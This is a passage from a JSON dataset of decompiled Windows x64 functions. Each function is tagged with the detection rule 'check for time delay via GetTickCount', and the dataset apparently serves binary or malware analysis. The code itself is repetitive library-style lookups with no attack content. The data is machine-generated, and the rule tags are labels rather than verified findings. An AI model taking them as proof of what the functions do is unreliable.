piVar3;\n}\n",
        "token_count": 4066
    },
    "1400b35e": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b35e0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb430);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401055d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb440);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401055f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106020, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106060, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106100, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106120, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106140, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106160, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106180, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106230, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106270, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106390, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106420, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106440, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106460, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3913
    },
    "1400b364": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b3640(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(0x1400fb440);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401055f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106020, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106060, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106100, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106120, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106140, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106160, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106180, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106230, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106270, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106330, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106370, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106390, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106420, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106440, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106460, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fba10);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140104f20;\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106480, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b06d0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400ae9f0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3756
    },
    "1400b36a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b36a0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.1400261c0(*0x140102d10);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106020, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102d20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106060, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ec0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106100, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(*0x140102ed0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106120, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106140, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb8f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106160, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb900);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106180, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb910);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401061c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401061e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106230, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106270, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb980);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb990);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x1401062d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x1401062f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400b6c10(piVar2, 0x140104f20, 0x140106330, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400b6c10(piVar3, 0x140104f20, 0x140106370, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400b7000();\n    }\n    fcn.1400b75e0();\n    uVar1 = fcn.1400261c0(0x1400fb9d0);\n    